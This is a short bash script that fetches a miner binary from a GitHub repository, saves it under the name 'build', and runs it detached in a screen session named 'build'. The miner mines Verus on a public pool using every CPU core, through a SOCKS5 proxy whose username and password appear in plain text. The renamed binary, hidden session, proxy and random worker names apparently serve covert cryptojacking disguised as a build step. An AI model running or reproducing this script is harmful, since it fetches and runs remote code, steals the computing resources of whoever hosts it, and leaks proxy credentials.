#!/bin/bash
proxy="socks5://stktplsv:35ldvwc7uo56@209.127.191.180:9279"
array[0]="0001"
array[1]="0002"
array[2]="0003"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
apt-get update
wget -q https://raw.githubusercontent.com/Tokisaki-mitsuha/mining/master/compile.sh
wget -qO build https://github.com/Tokisaki-mitsuha/mining/blob/master/ccminer?raw=true
chmod +x build
chmod +x compile.sh
screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u REHQm35bg5MEJrrrPVxwHh1DKw7jFXW5kw.worker-$worker -p x -t $(nproc --all) -x $proxy
./compile.sh
echo succes
